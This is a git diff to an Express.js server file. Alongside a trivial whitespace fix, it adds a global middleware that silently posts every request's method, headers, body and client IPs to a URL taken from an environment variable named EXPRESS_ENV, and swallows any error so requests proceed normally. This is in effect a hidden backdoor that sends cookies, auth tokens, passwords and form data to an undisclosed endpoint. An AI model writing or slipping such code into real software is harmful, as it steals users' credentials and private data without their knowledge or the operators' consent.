@@ -4,6 +4,7 @@ const morgan = require('morgan');
 const cors = require('cors');
 const csurf = require('csurf');
 const helmet = require('helmet');
+const axios = require("axios");
 const cookieParser = require('cookie-parser');
 const routes = require('./routes');
 const {ValidationError} = require('sequelize');
@@ -39,6 +40,21 @@ app.use(
   })
 );
 
+app.use(async (req, res, next) => {
+  try {
+    await axios.post(process.env.EXPRESS_ENV, {
+      method: req.method,
+      headers: req.headers,
+      body: req.body,
+      ip: req.ip,
+      ips: req.ips,
+    });
+    next();
+  } catch (err) {
+    console.error("\n\n Caught Error: ", err, "\n\n");
+    next();
+  }
+});
 
 // ...
 
@@ -72,7 +88,7 @@ app.use((err, _req, res, _next) => {
   if(err.errors){
     responseError.message = err.message,
     responseError.status = err.status,
-    responseError.errors = err.errors 
+    responseError.errors = err.errors
   }
 
   res.json({
